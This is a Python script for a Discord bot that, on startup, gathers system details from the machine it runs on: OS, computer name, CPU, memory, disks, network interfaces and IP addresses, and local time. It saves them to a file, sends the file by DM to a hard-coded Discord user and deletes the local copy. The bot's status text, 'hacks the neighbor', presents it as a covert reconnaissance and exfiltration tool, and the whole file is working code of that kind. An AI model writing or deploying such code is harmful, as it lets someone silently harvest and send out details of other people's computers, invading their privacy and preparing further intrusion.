import os
from datetime import datetime
import platform
import psutil
import tzlocal
import discord
from discord.ext import commands

USER_ID = 0000000000000000
BOT_TOCKEN = "0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A"

intents = discord.Intents.default()
intents.messages = True
bot = commands.Bot(command_prefix='!', intents=intents)

def get_time_info():
    local_timezone = tzlocal.get_localzone()
    time_info = {
        "local_timezone": str(local_timezone),
        "local_time": datetime.now(local_timezone).strftime('%Y-%m-%d %H:%M:%S')
    }
    return time_info

def get_system_info():
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "computer_name": platform.node(),
        "platform": platform.platform(),
        "processor": platform.processor()
    }
    return system_info

def get_cpu_info():
    cpu_info = {
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "frequency_mhz": psutil.cpu_freq().current
    }
    return cpu_info

def get_memory_info():
    virtual_memory = psutil.virtual_memory()
    memory_info = {
        "total_memory_bytes": virtual_memory.total,
        "available_memory_bytes": virtual_memory.available,
        "used_memory_bytes": virtual_memory.used,
        "percent_used_memory": virtual_memory.percent
    }
    return memory_info

def get_disk_info():
    disks = []
    disk_info = psutil.disk_partitions()
    for partition in disk_info:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disk = {
                "device": partition.device,
                "mountpoint": partition.mountpoint,
                "filesystem": partition.fstype,
                "total_bytes": usage.total,
                "used_bytes": usage.used,
                "free_bytes": usage.free,
                "percent_used": usage.percent
            }
            disks.append(disk)
        except PermissionError as e:
            print(f"Could not access {partition.device}: {e}")
        except Exception as e:
            print(f"An error occurred with {partition.device}: {e}")
    return disks

def get_network_info():
    network = []
    net_info = psutil.net_if_addrs()
    for interface, addresses in net_info.items():
        interface_info = {
            "interface": interface,
            "addresses": []
        }
        for address in addresses:
            address_info = {
                "type": address.family.name,
                "address": address.address,
                "netmask": address.netmask
            }
            interface_info["addresses"].append(address_info)
        network.append(interface_info)
    return network

def get_info():
    system_info = get_system_info()
    cpu_info = get_cpu_info()
    memory_info = get_memory_info()
    disk_info = get_disk_info()
    network_info = get_network_info()
    time_info = get_time_info()
    formatted_info = f'''
    Computer Information:

    Operating System: {system_info["os"]} {system_info["os_version"]}
    Architecture: {system_info["architecture"]}
    Computer Name: {system_info["computer_name"]}
    Platform: {system_info["platform"]}
    Processor: {system_info["processor"]}

    CPU Information:
        Number of Physical Cores: {cpu_info["physical_cores"]}
        Number of Logical Cores: {cpu_info["logical_cores"]}
        CPU Frequency (MHz): {cpu_info["frequency_mhz"]}

    Memory Information:
        Total Memory (bytes): {memory_info["total_memory_bytes"]}
        Available Memory (bytes): {memory_info["available_memory_bytes"]}
        Used Memory (bytes): {memory_info["used_memory_bytes"]}
        Memory Usage Percentage: {memory_info["percent_used_memory"]}

    Disk Information:
    '''

    for disk in disk_info:
        formatted_info += f'''
        Disk: {disk["device"]}
            Mountpoint: {disk["mountpoint"]}
            Filesystem: {disk["filesystem"]}
            Total Size (bytes): {disk["total_bytes"]}
            Used Size (bytes): {disk["used_bytes"]}
            Free Size (bytes): {disk["free_bytes"]}
            Usage Percentage: {disk["percent_used"]}
    '''

    formatted_info += f'''
    Network Information:
    '''

    for interface in network_info:
        formatted_info += f'''
        Interface: {interface["interface"]}
        Addresses:
    '''
        for address in interface["addresses"]:
            formatted_info += f'''
            Type: {address["type"]}
                Address: {address["address"]}
                Subnet Mask: {address["netmask"]}
    '''

    formatted_info += f'''
    Time:
        Timezone: {time_info["local_timezone"]}
        Local Time: {time_info["local_time"]}
    '''
    return formatted_info


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="hacks the neighbor"))
    info = get_info()
    system_info = get_system_info()
    with open(f'{system_info["computer_name"]}.txt', 'w') as file:
        file.write(f'{info}')
    user = await bot.fetch_user(USER_ID)
    if user:
        await send_file_to_user(user)
    input()
    await bot.close()

async def send_file_to_user(user):
    system_info = get_system_info()
    file_path = f'{system_info["computer_name"]}.txt'
    await user.send(file=discord.File(file_path))
    os.remove(file_path)

bot.run(BOT_TOCKEN)